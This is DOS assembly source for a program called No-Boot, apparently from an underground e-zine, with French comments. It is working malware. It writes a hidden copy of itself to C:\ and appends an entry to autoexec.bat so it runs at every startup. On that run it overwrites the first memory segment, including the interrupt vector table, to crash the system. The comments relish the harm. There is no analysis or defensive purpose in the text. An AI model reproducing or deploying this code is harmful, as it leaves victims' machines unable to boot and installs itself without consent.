;-------[  RtC Mag, At the end of the universe  ]

;--------------[  No-boot  ]


;No-Boot
;a program by Androgyne

.model tiny
.code

	org 100h

Start:
        jmp Prepare_Crashing
	nop
	nop
	nop

Crash_Windows:

	xor ax,ax			;c'est ça qui va faire mal
	mov es,ax			;on se place en es:di = 0000:0000
	xor di,di
	mov cx,0FFFFh
    Crash_Loop:
	stosw				;on recopie ax 65536 fois dans le premier segment
	loop Crash_Loop

	mov ax,4C00h			;ça, c'est juste au cas où...
	int 21h

Prepare_Crashing:

	mov si,offset Begin		;on efface le jmp du début et on met des nop
	mov di,100h
	mov cx,4
	rep movsb

Copy_No_boot:

	mov cx,00000010b		;on crée un fichier No-Boot dans C:\
	mov dx,offset File_Name		;le fichier sera caché
	mov ah,3Ch
	int 21h
	jc The_End
	mov bx,ax

	mov al,0			;on place le pointeur de fichier au début
	xor cx,cx
	xor dx,dx
	mov ah,42h
	int 21h

        mov cx,offset that_s_all_folks - offset Start
	mov dx,offset Start
	mov ah,40h			;on s'y recopie
	int 21h
	jc The_End

	mov ah,3Eh			;on ferme
	int 21h

Infect_Autoexec:

	mov dx,offset Autoexec
	mov al,2
	mov ah,3Dh			;on ouvre autoexec.bat
	int 21h
	jc The_End
	mov bx,ax

	mov al,2
	xor cx,cx			;on met le pointeur à la fin
	xor dx,dx
	mov ah,42h
	int 21h

	mov cx,Path_Length
	mov dx,offset File_Path		;on écrit le mot magique
	mov ah,40h
	int 21h
	jc The_End

	mov ah,3Eh			;on ferme
	int 21h

The_End:

	mov ax,4C00h			;et voilà, c'est fini
	int 21h

AutoExec db 'C:\Autoexec.bat',0
File_Name db 'C:\No-Boot.com',0
File_Path db 0Dh,0Ah,'No-Boot',0Dh,0Ah
Path_Length equ $ - File_Path
Begin db 4 dup (90h)

That_s_all_folks:

end Start


;-------[  EOF
